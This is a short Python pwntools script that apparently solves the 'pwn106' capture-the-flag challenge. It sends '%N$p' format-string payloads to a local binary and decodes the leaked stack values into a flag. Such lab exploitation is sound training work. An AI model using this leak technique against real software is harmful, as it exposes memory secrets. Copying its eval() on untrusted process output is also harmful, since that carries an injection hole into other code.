from pwn import *
import re

elf = context.binary = ELF("./pwn106")

flag = ''

for i in range(100):
    try:
        p = process()
        p.sendline('%{}$p'.format(i).encode())
        p.recvuntil(b'Thanks ')
        result = p.recvline(timeout=1) or b''
        if not result or b'nil' in result:
            p.close()
            continue

        m = re.search(rb'0x([0-9A-Fa-f]+)', result)
        if m:
            hx = m.group(1).decode()
        else:
            m2 = re.search(rb'([0-9A-Fa-f]{4,})', result)
            if m2:
                hx = m2.group(1).decode()
            else:
                raw = result.strip()
                if raw.startswith(b"b'") or raw.startswith(b'b"'):
                    try:
                        raw = eval(raw.decode())
                    except Exception:
                        pass
                text = raw.decode('latin-1').rstrip('\x00')
                if text and text not in ('0', ''):
                    print(str(i) + ': ' + repr(text))
                    flag += text
                p.close()
                continue

        if len(hx) % 2 == 1:
            hx = '0' + hx

        decoded = bytes.fromhex(hx)
        reversed_hex = decoded[::-1]
        piece = reversed_hex.decode('latin-1').rstrip('\x00')
        print(str(i) + ': ' + repr(piece))
        flag += piece

        p.close()
    except EOFError:
        try:
            p.close()
        except:
            pass

log.success(f"Flag: {flag}")
